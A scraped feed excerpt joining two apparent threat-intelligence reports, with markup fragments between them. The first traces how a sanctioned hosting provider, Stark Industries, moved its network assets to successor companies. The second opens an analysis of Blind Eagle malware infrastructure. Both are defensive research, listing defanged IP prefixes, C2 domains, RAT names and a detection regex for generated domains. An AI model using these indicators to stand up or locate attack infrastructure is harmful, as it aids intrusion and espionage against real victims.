Ukraine, Stark Industries rapidly became a central platform for significant distributed denial-of-service (DDoS) attacks conducted by hacktivist group NoName057(16). Furthermore, Stark Industries' infrastructure was highlighted in early 2024 as central to the resurgence of the financially motivated threat actor FIN7. As late as mid-2025, Insikt Group has continued to observe GrayAlpha, a threat cluster with significant overlap with FIN7, rely on Stark Industries' infrastructure.\nOn May 20, 2025, the EU sanctioned Stark Industries Solutions Ltd, along with its CEO, Iurie Neculiti, and owner, Ivan Neculiti, for enabling Russian state-sponsored cyber operations, including information manipulation, cyberattacks, and other destabilizing hybrid activities targeting the EU and its partners. Insikt Group tracks Stark Industries Solutions Ltd (referenced hereafter as Stark Industries) and its parent company, PQ.Hosting, as threat activity enablers (TAEs) that enable a multitude of state-sponsored cyber operations linked to Russia, Iran, North Korea, and China, as well as cybercriminal groups.\nThreat Analysis\nEU Sanctions Stark Industries\nOn May 20, 2025, the Council of the European Union sanctioned internet service provider (ISP) Stark Industries, along with its CEO, Iurie Neculiti, and owner, Ivan Neculiti. Insikt Group tracks Stark Industries and its parent organization, PQ.Hosting, as TAEs, enabling a multitude of state-sponsored cyber operations linked to Russia, Iran, North Korea, and China, as well as cybercriminal groups. Insikt Group notes that although PQ.Hosting was referenced within the sanctions multiple times alongside Stark Industries, the company itself was not sanctioned. Details of the sanctioned company and individuals are outlined in Tables 1 and 2.\nCompany\nRegistration Number\nAddress\nWebsites\nStark Industries Solutions Ltd.\n13906017\n71-75 Shelton Street, Covent Garden, London, UK\npq[.]hosting\nstark-industries[.]solutions\nTable 1: Stark Industries Solutions sanctions details (Source: EU Council)\nName\nFunction\nNationality\nAddress\nPlace of Birth\nIurie Neculiti\nCEO of Stark Industries\nMoldovan\n71-75 Shelton Street, Covent Garden, London, United Kingdom\nBender, Republic of Moldova\nChisinau, Republic of Moldova\nIvan Neculiti\nOwner of Stark Industries\nMoldovan\n71-75 Shelton Street, Covent Garden, London, United Kingdom\nBender, Republic of Moldova\nChisinau, Republic of Moldova\nTable 2: CEO and owner of Stark Industries Solutions sanctions details (Source: EU Council)\nThe EU attributed Stark Industries' infrastructure to enabling various Russian state-sponsored and affiliated threat actors to conduct destabilizing activities, including information manipulation, interference, and cyberattacks against the European Union and third countries. Furthermore, Insikt Group's 2024 Malicious Infrastructure Report highlighted Stark Industries' infrastructure as one of the top services enabling global cyber threats (see Figure 1). To view malware samples that exhibit network connections to Stark Industries' infrastructure, queries are available in Appendix A for Recorded Future’s Malware Intelligence module.\nFigure 1: Top fifteen validated malware families on Stark Industries ASNs in 2024 (Source: Recorded Future)\nTimeline of Events\nThe following timeline is based on Insikt Group’s analysis conducted between May 16, 2025, and June 24, 2025. It outlines key events surrounding the EU’s sanctioning of Stark Industries, including pre-sanctions reporting, early infrastructure shifts, and post-designation rebranding.\nFigure 2: Timeline of events observed by Insikt Group (Source: Recorded Future)\nThe sequence of events indicates that Stark Industries and its affiliated entities likely anticipated forthcoming EU sanctions, potentially as early as April 2025. Public reporting in Moldovan and EU media beginning in early May is highly likely to have triggered further operational shifts, including the creation of new corporate structures and early-stage infrastructure migration. These actions, occurring days before the official designation, suggest a deliberate attempt to mitigate the impact of sanctions and preserve the continuity of hosting services under alternative branding and network ownership.\nPre-Sanctions\nExposure in Moldovan and EU Press\nOn May 8, 2025, the Moldovan arm of Radio Free Europe/Radio Liberty (RFE/RL) revealed that two Moldovan nationals, Ivan and Iurie Neculiti, founders of Stark Industries, were slated for inclusion in the EU’s next sanctions package targeting individuals involved in Russia’s hybrid warfare campaign. The article cited direct access to a leaked EU document listing proposed designations, which accused the Neculiti brothers of enabling Russian state-sponsored destabilizing activities against the EU and its partners through their web-hosting company. A follow-up article released by RFE/RL’s central newsroom on May 9, 2025, further confirmed the proposed sanctions and framed them within the broader sanctions package under consideration by the European Commission.\nInfrastructure Updates\nOn May 16, 2025, Insikt Group observed that the Autonomous System Number (ASN) AS44477, previously registered to Stark Industries, had been transferred to a newly created RIPE organization in the name of its parent company, PQ Hosting Plus S.R.L., under RIPE identifier ORG-PHPS1-RIPE. This organization object was created just three days prior, on May 13, 2025, following RFE/RL’s reporting of the upcoming EU sanctions package (see Figure 3).\norganisation: ORG-PHPS1-RIPE\norg-name: PQ HOSTING PLUS S.R.L.\ncountry: MD\norg-type: LIR\naddress: str.

However, upon analyzing announcements from UFO Hosting’s ASN, AS33993 (UFO-AS), it became apparent that Stark Industries was seemingly leveraging the provider to announce its Russian IP prefixes (see Figure 4).\nFigure 4: Pre-sanction infrastructure changes as of May 19, 2025 (Source: Recorded Future / RIPE DB)\nUFO Hosting\nUFO Hosting is a Russia-based ISP that was first registered with RIPE on March 13, 2025, under the RIPE identifier ORG-UHL6-RIPE. Russian company registration documents list Savushkin Mikhail Yuryevich as the owner and the registration date as February 18, 2025.\nThe company offers VPS/VDS and dedicated server hosting via its website ufo[.]hosting. The website’s user agreement section suggests the company is officially registered under the name YuFO Hosting (ЮФО Хостинг) in Moscow (see Figure 5).\nFigure 5: UFO Hosting website user agreement page (Source: ufo[.]hosting)\nAs of May 16, 2025, AS33993 (UFO-AS) announced 21 IP prefixes (see Appendix B). Insikt Group identified that all prefixes directly assigned to UFO Hosting’s RIPE organization (ORG-UHL6-RIPE) were transferred from Stark Industries. Most of these transfers occurred on April 13, 2025 (see Figure 6).\nFigure 6: Example of IP prefix transfer from Stark Industries to UFO Hosting (Source: Recorded Future / RIPEstat)\nInsikt Group also identified several domains associated with Stark Industries and PQ.Hosting infrastructure resolving indirectly to IP addresses announced and controlled by UFO Hosting, further signaling an operational migration. While public DNS resolution showed these domains resolving to StormWall s.r.o DDoS protection endpoints, reverse DNS analysis of the underlying IP space revealed matching domain references on IP addresses transferred from Stark Industries (see Table 3).\ndomain\nIP\nASN\nISP\nbill-migration-db[.]stark-industries[.]solutions\n45[.]121[.]14[.]142\nAS33993\nUFO Hosting LLC\npq-ru[.]digitalvpn[.]org\n45[.]144[.]31[.]195\nAS33993\nUFO Hosting LLC\npq[.]company\n45[.]67[.]230[.]222\nAS33993\nUFO Hosting LLC\nregistry[.]pq[.]hosting\n45[.]67[.]230[.]171\nAS33993\nUFO Hosting LLC\nrussia[.]stark-industries[.]solutions\n94[.]131[.]113[.]248\nAS33993\nUFO Hosting LLC\nTable 3: Stark Industries and PQ.Hosting domains resolving to UFO Hosting IP addresses (Source: Recorded Future)\nInsikt Group assesses with high confidence that UFO Hosting was established or repurposed as a vehicle for Russia-based infrastructure and clientele, providing a sanctions-resilient platform that enabled Stark Industries to discreetly migrate assets and maintain operational continuity ahead of EU enforcement.\nPost-Sanctions\nRebrand to THE.Hosting\nOn May 29, 2025, nine days after the EU formally sanctioned Stark Industries, its parent company, PQ.Hosting, announced a full rebranding and legal transition to a newly created entity, THE.Hosting. In a public statement, PQ.Hosting declared that the company had ceased to exist “as a legal entity and operational structure,” and that all assets, infrastructure, and services had been transferred to THE.Hosting, which would henceforth operate under new ownership and management (see Figure 7).\nFigure 7: Rebranding announcement on THE.Hosting’s new website (Source: the[.]hosting)\nThe rebranded website, operating under a new domain, the[.]hosting, referenced WorkTitans B.V. as the legal entity behind THE.Hosting (See Figures 8 and 9). Insikt Group notes that as of June 24, 2025, THE.Hosting removed any reference to WorkTitans from its website.\nFigure 8: THE.Hosting’s terms of use web page (Source: Archive[.]org)\nFigure 9: THE.Hosting’s terms of use, removing reference to WorkTitans B.V. (Top) and THE.Hosting’s previously observed terms of use page (Bottom) (Source: Archive[.]org)\nWorkTitans B.V.\nWorkTitans is a Netherlands-based company ostensibly registered and presenting as a recruitment firm, an affiliation that bears no logical connection to the hosting sector. This clear misalignment strongly suggests that Stark Industries used WorkTitans as its new Western corporate entity to obscure its continuity of control and insulate its rebranded infrastructure from sanctions. WorkTitans' website, worktitans[.]nl, displayed minimal functionality, with vague information about the company (see Figure 10) and a broken vacancy search page.\nFigure 10: WorkTitans web page (Source: worktitans[.]nl)\nInfrastructure Updates\nInsikt Group observed further changes to Stark Industries' infrastructure between May 29 and June 23, 2025, coinciding with the public rebranding of PQ.Hosting to THE.Hosting and the emergence of a new corporate vehicle, WorkTitans.\nOn May 29, 2025, Insikt Group observed IP prefixes previously attributed to Stark Industries Solutions began transferring to a newly registered RIPE organization object under the name WorkTitans B.V. Its corresponding RIPE object, ORG-THE3-RIPE, was created on May 28, 2025, the day before the public rebrand (see Figure 11).\nAbuse contact info: abuse[@]the[.]hosting\norganisation: ORG-THE3-RIPE\norg-name: WorkTitans B.V.\norg-type: OTHER\naddress: Hoge Bothofstraat 39, 7511 ZA Enschede, Netherlands\ncountry: NL\ne-mail: noc[@]the.hosting\nabuse-c: THE666\nmnt-ref: THE-HOSTING-MNT\nmnt-ref: MEREZHA-MNT\nmnt-by: THE-HOSTING-MNT\ncreated: 2025-05-28T17:30:07Z\nlast-modified: 2025-05-29T00:51:07Z\nsource: RIPE\nFigure 11: RIPE organization record ORG-THE3-RIPE (Source: RIPE DB)\nInsikt Group continued to monitor the transfer of IP prefixes to WorkTitans between May 29 and June 24, 2025, observing a new netname of THE-HOSTING. Further analysis of historical WHOIS records showed a clear progression — from initial assignment to Stark Industries to reassignment to PQ Hosting Plus S.R.L — leading up to the EU sanctions and subsequent transfer to WorkTitans following the rebrand (see Figure 12).\nFigure 12: WHOIS history for IP prefix 45[.]14[.]244[.]0/24 (Source: Recorded Future / RIPEstat)\nIn parallel with the observed prefix transfers, Insikt Group also tracked changes to ASN AS44477, registered initially to Stark Industries Solutions. While the responsible organization was updated to PQ Hosting Plus S.R.L., the ASNs name field was sequentially modified, first to reflect PQ.Hosting and, later, THE-HOSTING, aligning with the broader infrastructure rebrand (see Figure 13).\nFigure 13: RIPE AS record history for AS44477 (Source: Recorded Future / RIPEstat)\nBetween June 23 and June 24, 2025, Insikt Group identified the registration of a new Local Internet Registry (LIR) under the name WorkTitans B.V., along with a corresponding ASN, AS209847 (THE), further consolidating the rebrand under new RIPE organization object ORG-WB96-RIPE (See Figures 14 and 15). AS209847 announced 21 IP prefixes as of August 4, 2025 (See Appendix C).\nAbuse contact info: abuse[@]the[.]hosting\nOrganisation: ORG-WB96-RIPE\norg-name: WorkTitans B.V\ncountry: NL\norg-type: LIR\naddress: Hoge Bothofstraat 39\naddress: 7511 ZA\naddress: Enschede\naddress: NETHERLANDS\nphone: +31532060000\ne-mail: lir[@]the.hosting\nadmin-c: THMC1-RIPE\ntech-c: THMC1-RIPE\nabuse-c: AR78445-RIPE\nmnt-ref: THE-HOSTING-MNT\nmnt-by: RIPE-NCC-HM-MNT\nmnt-by: THE-HOSTING-MNT\ncreated: 2025-06-23T11:10:15Z\nlast-modified: 2025-06-23T11:10:16Z\nsource: RIPE\nFigure 14: RIPE organization record ORG-WB96-RIPE (Source: RIPE DB)\nResponsible organisation: WorkTitans B.V\nAbuse contact info: abuse[@]the[.]hosting\naut-num: AS209847\nas-name: THE\norg: ORG-WB96-RIPE\nimport: from AS52000 accept ANY\nexport: to AS52000 announce AS209847:AS-THE\nimport: from AS49434 accept ANY\nexport: to AS49434 announce AS209847:AS-THE\nimport: from AS8285 accept ANY\nexport: to AS8285 announce AS209847:AS-THE\nimport: from AS9002 accept ANY\nexport: to AS9002 announce AS209847:AS-THE\nimport: from AS174 accept ANY\nexport: to AS174 announce AS209847:AS-THE\nimport: from AS1299 accept ANY\nexport: to AS1299 announce AS209847:AS-THE\nimport: from AS6939 accept ANY\nexport: to AS6939 announce AS209847:AS-THE\nimport: from AS44222 accept ANY\nexport: to AS44222 announce AS209847:AS-THE\nimport: from AS8285 accept ANY\nexport: to AS8285 announce AS209847:AS-THE\nimport: from AS15694 accept ANY\nexport: to AS15694 announce AS209847:AS-THE\nimport: from AS199081 accept ANY\nexport: to AS199081 announce AS209847:AS-THE\nFigure 15: RIPE AS record for AS209847 (Source: RIPE DB)\nMaintainer Records and Links to Dmitrii Miasnikov\nInsikt Group conducted further analysis on the email address jama**[@]gmail[.]com, which initially linked Stark Industries to UFO Hosting via RIPE database maintainer objects earlier in this report. This analysis revealed that the email address was not only associated with PQHS-MNT (PQ.Hosting maintainer) and UFO42-MNT (UFO Hosting maintainer), but also with the newly created THE-HOSTING-MNT. As of June 24, 2025, these maintainer objects were responsible for all of the new RIPE organization objects outlined in this report, as well as further organizations tied to the Neculiti brothers, such as WEISS HOSTING GROUP S.R.L. (ORG-PHD16-RIPE; see Figure 16).\nFigure 16: Maintainer objects and organizations linked to email jama**[@]gmail[.]com (Source: Recorded Future / RIPE DB)\nFurther research into this email address confirmed its attribution to Dmitrii Miasnikov, a known Russian network operator with prior affiliations to numerous Russia-based hosting providers. Specifically, the same email address was used to submit multiple RIPE NCC Executive Board nominations in April 2020 under Miasnikov’s name, listing various Russian hosting entities as his affiliated organizations).\nAccording to the RIPE database, Miasnikov also operates two LIRs under his own name, ORG-DAM5-RIPE and ORG-DAM6-RIPE. Insikt Group notes that as of June 24, 2025, only one prefix was assigned to ORG-DAM5-RIPE, 91[.]207[.]183[.]0/24, which was outlined in Appendix B, as announced via AS33993 (UFO-AS).\nBoth objects contain the email address admin[@]virty[.]io, which refers to another Russian ISP, virty[.]io, which is owned by First Data Center LLC (ООО \"Первый ЦОД\"). In addition to traditional hosting, the company offers a number of what it calls “RIPE Object Support and Registration Services” (see Figure 17).\nFigure 17: Virty[.]io RIPE services web page (Source: virty[.]io)\nInsikt Group assesses that Miasnikov’s control over RIPE object registration services, combined with his access to multiple LIRs and maintainer objects, likely enabled him to facilitate the creation, transfer, and operational handoff of RIPE assets for Stark Industries, allowing the sanctioned entity to sustain infrastructure continuity under new organizational entities.\nMitigations\nUse Recorded Future Threat Intelligence: Recorded Future customers can proactively mitigate threats originating from malicious networks such as Stark Industries by operationalizing Recorded Future Intelligence Cloud data, specifically by leveraging continuously updated Risk Lists and by blocklisting validated malicious IP addresses to prevent internal communication with malicious infrastructure.\nImplement Robust Network Security Controls: Configure perimeter security appliances and internal network defenses to block traffic originating from the ASNs identified in this report, unless there is a clearly defined business justification for permitting such traffic.\nOutlook\nInsikt Group assesses that Stark Industries will likely continue operating with minimal disruption under its new corporate entities, THE.Hosting and UFO Hosting, despite its inclusion in the EU’s May 2025 sanctions package. The evidence outlined in this report demonstrates that the organization likely anticipated the EU sanctions and executed a deliberate, multi-phase restructuring of its hosting operations, using its parent company, PQ.Hosting, and Russian ISP, UFO Hosting.\nWhile the EU sanctions did reference PQ.Hosting, the company’s omission from a formal designation as part of the package, along with other linked entities, may have been a critical gap. This allowed Stark Industries to rapidly rebrand, transfer assets, and preserve operational control through affiliated RIPE organizations and front companies with relative ease.\nInsikt Group will continue to monitor the infrastructure, affiliations, and evolution of this TAE network, as its persistent role in supporting global malicious cyber operations remains a critical indicator of future threat activity.\nAppendix A: Malware Intelligence Queries\ndynamic.network.ips.asn == \"AS44477\"\ndynamic.network.ips.asn == \"AS209847\"\ndynamic.network.ips.asn == \"AS33993\"\nAppendix B: IP Prefixes Announced By AS33993 (UFO-AS)\nPrefix\nOrganization\nCountry\n2[.]56[.]178[.]0/24\nUFO Hosting LLC\nRussia\n45[.]12[.]114[.]0/24\nUFO Hosting LLC\nRussia\n45[.]12[.]115[.]0/24\nUFO Hosting LLC\nRussia\n45[.]67[.]230[.]0/24\nUFO Hosting LLC\nRussia\n45[.]84[.]1[.]0/24\nUFO Hosting LLC\nRussia\n45[.]128[.]49[.]0/24\nUFO Hosting LLC\nRussia\n45[.]128[.]53[.]0/24\nUFO Hosting LLC\nRussia\n45[.]138[.]157[.]0/24\nStark Industries Solutions Ltd\nRussia\n45[.]144[.]30[.]0/24\nUFO Hosting LLC\nRussia\n45[.]144[.]31[.]0/24\nUFO Hosting LLC\nRussia\n45[.]150[.]64[.]0/24\nUFO Hosting LLC\nRussia\n45[.]153[.]231[.]0/24\nStark Industries Solutions Ltd\nRussia\n91[.]207[.]183[.]0/24\nDmitrii Aleksandrovich Miasnikov\nRussia\n94[.]131[.]113[.]0/24\nUFO Hosting LLC\nRussia\n94[.]131[.]121[.]0/24\nUFO Hosting LLC\nRussia\n103[.]113[.]68[.]0/24\nUFO Hosting LLC\nRussia\n171[.]22[.]119[.]0/24\nUFO Hosting LLC\nRussia\n185[.]234[.]59[.]0/24\nUFO Hosting LLC\nRussia\n185[.]235[.]242[.]0/24\nUFO Hosting LLC\nRussia\n185[.]250[.]149[.]0/24\nUFO Hosting LLC\nRussia\n193[.]201[.]126[.]0/24\nStark Industries Solutions Ltd\nRussia\nAppendix B: IP Prefixes announced via AS33993, UFO-AS (Source: BGP.tools)\nAppendix C: IP Prefixes Announced By AS209847 (THE)\nPrefix\nOrganization\nCountry\n2[.]56[.]119[.]0/24\nWorkTitans B.V\nLatvia\n5[.]182[.]39[.]0/24\nWorkTitans B.V\nPortugal\n45[.]12[.]131[.]0/24\nWorkTitans B.V\nPortugal\n45[.]15[.]178[.]0/24\nWorkTitans B.V\nBosnia and Herzegovina\n45[.]15[.]179[.]0/24\nWorkTitans B.V\nBosnia and Herzegovina\n45[.]15[.]184[.]0/24\nWorkTitans B.V\nBosnia and Herzegovina\n45[.]83[.]142[.]0/24\nWorkTitans B.V\nPortugal\n45[.]133[.]216[.]0/24\n-\n            \nLatvia\n45[.]142[.]213[.]0/24\n-\n            \nLatvia\n45[.]142[.]215[.]0/24\n-\n            \nLatvia\n45[.]159[.]251[.]0/24\nWorkTitans B.V\nPortugal\n94[.]131[.]10[.]0/24\nWorkTitans B.V\nPortugal\n94[.]131[.]104[.]0/24\nWorkTitans B.V\nLatvia\n95[.]164[.]32[.]0/24\nWorkTitans B.V\nPortugal\n103[.]231[.]73[.]0/24\nWorkTitans B.V\nLatvia\n171[.]22[.]129[.]0/24\nWorkTitans B.V\nPortugal\n176[.]120[.]67[.]0/24\nWorkTitans B.V\nLatvia\n193[.]43[.]146[.]0/24\nWorkTitans B.V\nLatvia\n2a09[:]7c43[:][:]/32\nWorkTitans B.V\nLatvia\n2a0b[:]cf43[:][:]/32\nWorkTitans B.V\nPortugal\n2a0b[:]cf43[:][:]/32\nWorkTitans B.V\nBosnia and Herzegovina\nAppendix C: IP prefixes announced via AS209847, THE (Source: BGP.tools)","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1fc49964e13a22a562cd72708432c38c3e02e776d.gif?width=1200&format=pjpg&optimize=medium"},"content":"Before facing EU sanctions in May 2025, Stark Industries Solutions executed a strategic infrastructure overhaul to maintain operations.

These clusters have operated at various times throughout 2024 and 2025, targeting a significant number of victims, primarily within the Colombian government across local, municipal, and federal levels. Although the clusters share similar tactics, techniques, and procedures (TTPs) such as leveraging open-source and cracked remote access trojans (RATs), dynamic domain providers, and legitimate internet services (LIS) for staging, they differ significantly in infrastructure, malware deployment, and other operational methods. Insikt Group also found further evidence linking TAG-144 to Red Akodon and identified various compromised Colombian government email accounts likely used in spearphishing campaigns.</p>\n        <p>To protect against TAG-144, security defenders should block IP addresses and domains tied to associated RATs, flag and potentially block connections to unusual LIS, and deploy updated detection rules (YARA, Sigma, Snort) for current and historic infections. Other controls include implementing email filtering and data exfiltration monitoring. See the <strong>Mitigations</strong> section for implementation guidance and <strong>Appendix B</strong> for a complete list of IoCs. In the long term, analysts should continuously monitor the cybercriminal ecosystem for emerging threats and adapt controls accordingly.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group has tracked five distinct activity clusters associated with TAG-144 (Blind Eagle), each displaying overlapping yet varied TTPs and collectively targeting numerous victims, primarily within the Colombian government, throughout 2024 and 2025.</li>\n          <li>TAG-144 appears to maintain an extensive operational infrastructure, comprising virtual private servers (VPS), IP addresses within Colombian ISP ranges, and servers that appear to function as VPN servers. These typically host domains registered through various dynamic DNS services such as <em>duckdns[.]org</em>, <em>noip[.]com</em>, and <em>con-ip[.]com</em>, among others.</li>\n          <li>TAG-144 has employed a wide array of open-source and cracked RATs, including AsyncRAT, DcRAT, REMCOS RAT, XWorm, and LimeRAT, among others. These payloads are typically deployed through a multi-stage infection chain that leverages an expanding set of LIS and uses steganography to obscure malicious content and evade detection.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>TAG-144, also known as Blind Eagle, AguilaCiega, APT-C-36, and APT-Q-98, is a threat group that has been <a href=\"https://cyberpress.org/new-apt-group-blindeagle-strikes-organizations/\">active</a> since at least 2018, primarily targeting South America, especially Colombia. While the threat group’s overall motivation <a href=\"https://securelist.com/blindeagle-apt/113414/\">remains</a> ambiguous, its activity reflects both cyber-espionage and financially driven motivations. TAG-144’s primary focus appears to be on credential theft, evidenced by banking-related keylogging and browser monitoring, alongside indications of espionage, such as persistently targeting government entities and using modified RATs with surveillance functions (<a href=\"https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html\">1</a>, <a href=\"https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/\">2</a>).</p>\n        <p>The group’s primary targets include government institutions, especially judiciary and tax authorities, alongside financial entities, petroleum and energy companies, and organizations within the education, healthcare, manufacturing, and professional services sectors (<a href=\"https://hivepro.com/wp-content/uploads/2024/09/TA2024345.pdf\">1</a>, <a href=\"https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/\">2</a>). Operations are mainly focused on Colombia, with additional activity in <a href=\"https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/\">Ecuador</a>, <a href=\"https://securelist.com/blindeagle-apt/113414/\">Chile</a>, and <a href=\"https://securelist.com/blindeagle-apt/113414/\">Panama</a>, and occasional campaigns in North America <a href=\"https://www.esentire.com/blog/blind-eagles-north-american-journey\">targeting</a> Spanish-speaking users.</p>\n        <p>Initial access typically <a href=\"https://lab52.io/blog/apt-c-36-recent-activity-analysis/\">occurs</a> through spearphishing campaigns impersonating local government agencies, most notably Colombian authorities. These campaigns leverage themes such as debt collection and judicial notifications to lure victims into opening malicious documents (<a href=\"https://blog.scilabs.mx/malware-campaign-attributed-to-apt-c-36-context-and-iocs-update-june-2022/\">1</a>, <a href=\"https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/\">2</a>). They have often <a href=\"https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html\">used</a> URL shorteners like <em>cort[.]as</em>, <em>acortaurl[.]com</em>, and <em>gtly[.]to</em> to conceal malicious links and target users geographically. TAG-144 employs geo-fencing and other detection evasion measures that <a href=\"https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/\">block</a> access from outside Colombia or Ecuador, <a href=\"https://www.trendmicro.com/en_ph/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html\">redirecting</a> outsiders to official government websites. TAG-144 has consistently leveraged compromised email accounts in its spearphishing campaigns, including those associated with government entities and private individuals.</p>\n        <p>TAG-144 leverages a range of commodity remote access trojans (RATs), including AsyncRAT, REMCOS RAT, DcRAT, njRAT, LimeRAT, QuasarRAT, BitRAT, and a Quasar variant <a href=\"https://www.zscaler.com/blogs/security-research/blindeagle-targets-colombian-insurance-sector-blotchyquasar\">known</a> as BlotchyQuasar. Its tooling also <a href=\"https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/\">involves</a> crypters such as HeartCrypt, PureCrypter, and those developed by threat actors like “Roda” and “pjoao1578”, with indicators pointing to the use of crypter-as-a-service offerings such as CryptersAndTools, which originates from Brazil. Additionally, it <a href=\"https://securelist.com/blindeagle-apt/113414/\">employs</a> steganography techniques, embedding malicious payloads within image files to evade detection.</p>\n        <p>TAG-144’s command-and-control (C2) infrastructure often <a href=\"https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/\">incorporates</a> IP addresses from Colombian ISPs alongside virtual private servers (VPS) such as Proton666 and VPN services like Powerhouse Management, FrootVPN, and TorGuard (<a href=\"https://lab52.io/blog/apt-c-36-recent-activity-analysis/\">1</a>, <a href=\"https://censys.com/blog/unmasking-the-infrastructure-of-a-spearphishing-campaign\">2</a>). This setup is further <a href=\"https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia\">enhanced</a> by the use of dynamic DNS services, including <em>duckdns[.]org</em>, <em>ip-ddns[.]com</em>, and <em>noip[.]com</em>. The threat group is suspected, though not definitively confirmed, to use compromised routers, which are then repurposed as reverse proxies to obscure the true locations of their C2 servers and complicate attribution.</p>\n        <p>The threat group has consistently leveraged LIS, particularly during the payload staging phase. These services include widely used platforms like Bitbucket, Discord, Dropbox, GitHub, Google Drive, Paste.ee, and lesser-known platforms such as undisclosed Brazilian image-hosting websites. Additionally, the group has been observed using compromised accounts to host malicious content, including a Google Drive folder <a href=\"https://www.zscaler.com/blogs/security-research/blindeagle-targets-colombian-insurance-sector-blotchyquasar\">tied</a> to a compromised account associated with a regional Colombian government organization.</p>\n        <p>The threat group's origin remains uncertain, though multiple studies suggest it operates within the UTC-5 or UTC-4 time zones (<a href=\"https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/\">1</a>, <a href=\"https://web.archive.org/web/20190625182633/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/\">2</a>), consistent with countries like Colombia and Ecuador, with some research specifically pointing to Colombia as its base. Notably, technical artifacts have <a href=\"https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin\">contained</a> both Spanish- and Portuguese-language comments. The Spanish <a href=\"https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/\">observed</a> in the comments closely resembles the regional dialects commonly spoken in the targeted countries. Additionally, the threat group has been observed using tools and services tied to the Brazilian cybercriminal underground, <a href=\"https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin\">indicating</a> a possible connection with Brazilian threat actors.</p>\n        <p>Three key factors set TAG-144 apart within the cybercriminal ecosystem. First, while globalization, cybercriminal collaboration, and hardware/software standardization have lowered barriers for threat actors to operate globally, threat actors, including TAG-144, often remain regionally focused due to cultural nuances, tacit knowledge, and persistence. Second, despite some tooling improvements, TAG-144 has largely relied on consistent techniques since its emergence. Their continued success, reflected in a high number of victims, underscores how well-established methods remain effective over time. Lastly, TAG-144 exemplifies the increasingly blurred lines between cybercrime and espionage, a trend that has become more prominent in the coming year. In this context, a comprehensive approach to tackling cyber threats becomes even more crucial, requiring improved defenses, deeper regional knowledge, and enhanced coordination.</p>\n        <h2>Threat Analysis</h2>\n        <p>Insikt Group identified five activity clusters associated with TAG-144 that were active between May 2024 and July 2025 (see <strong>Figure 1</strong>).

Cluster 1 is linked to DcRAT, AsyncRAT, and REMCOS RAT infections targeting Colombian government entities exclusively.</li>\n          <li><strong>Cluster 2</strong>, active between September and December 2024, included C2 IPs tied to AS-COLOCROSSING, Colombian ISPs, and VULTR hosting <em>duckdns[.]org</em>, <em>con-ip[.]com</em>, and <em>kozow[.]com</em> domains. Cluster 2 is associated with AsyncRAT activity targeting the Colombian government and entities in the education, defense, and retail sectors.</li>\n          <li><strong>Cluster 3</strong>, active from September 2024 to July 2025, consists of C2 IPs linked to Colombian ISP UNE EPM hosting <em>duckdns[.]org</em> and, occasionally, <em>con-ip[.]com</em> domains. Cluster 3 is associated with both AsyncRAT and REMCOS RAT deployments.</li>\n          <li><strong>Cluster 4</strong>, active from May 2024 to February 2025, is notable for combining malware and phishing infrastructure attributed to TAG-144.</li>\n          <li><strong>Cluster 5</strong>, active from March to July 2025, consists of C2 IPs linked to GLESYS (AS42708) hosting dynamically resolving <em>duckdns[.]org</em> domains. Cluster 5 is associated with LimeRAT and a cracked AsyncRAT variant seen in Clusters 1 and 2.</li>\n        </ul>\n        <p>Insikt Group identified infrastructure overlaps between the clusters, establishing a connection among them. Additionally, the clusters share notable similarities in TTPs, including infrastructure choices, domain naming patterns, malware deployment, and the abuse of LIS. However, each cluster also exhibits distinct differences, which are explored in detail in the following sections of this report.</p>\n        <h3>Cluster 1</h3>\n        <p><strong><em>Infrastructure Analysis</em></strong></p>\n        <p>Cluster 1, active from at least February through July 2025, comprises C2 IP addresses primarily linked to TorGuard VPN servers and, in one case, a Colombian ISP. This cluster typically hosts <em>duckdns[.]org</em> and, more recently, <em>noip[.]com</em> domains with specific naming patterns; it has also been observed deploying DcRAT, AsyncRAT, and REMCOS RAT. The IP addresses linked to Cluster 1 are listed in <strong>Appendix A</strong>. The domains consistently resolve to the same static IP addresses over time, with minimal rotation observed within Cluster 1.</p>\n        <p>The subdomain names, likely generated by a domain generation algorithm (DGA), commonly include the word “envio” followed by a numeric part, as in, for example, <em>envio16-05[.]duckdns[.]org</em>. The names are detectable via the regex in <strong>Figure 2</strong> and are detailed in <strong>Appendix B</strong>.</p>\n        <div>\n          <div>\n            <div><code>envio[0-9\\-]{2,5}\\.duckdns\\.org</code></div>\n          </div>\n        </div>\n        <p><strong>Figure 2:</strong> Regex for suspected DGA linked to Cluster 1 (Source: Recorded Future)</p>\n        <p>While prior research has <a href=\"https://censys.com/blog/unmasking-the-infrastructure-of-a-spearphishing-campaign\">suggested</a> that the TorGuard VPN servers associated with Cluster 1 are used for port forwarding, the exposure of C2 components, such as default transport layer security (TLS) certificates tied to deployed malware families, indicates these IP addresses are likely dedicated VPN instances directly controlled by TAG-144.</p>\n        <p>In addition to the TorGuard VPN servers, Cluster 1 includes IP addresses associated with Colombian ISPs, such as Colombia’s primary provider, COLOMBIA TELECOMUNICACIONES S.A. E.S.P. While earlier reporting on Blind Eagle in 2020 <a href=\"https://lab52.io/blog/apt-c-36-recent-activity-analysis/\">suggested</a> the possible use of compromised routers for C2 infrastructure, Insikt Group has not confirmed such activity for the observed IP addresses.</p>\n        <p>Notably, several domains hosted on TorGuard VPN servers listed in <strong>Appendix A</strong> were previously resolved to 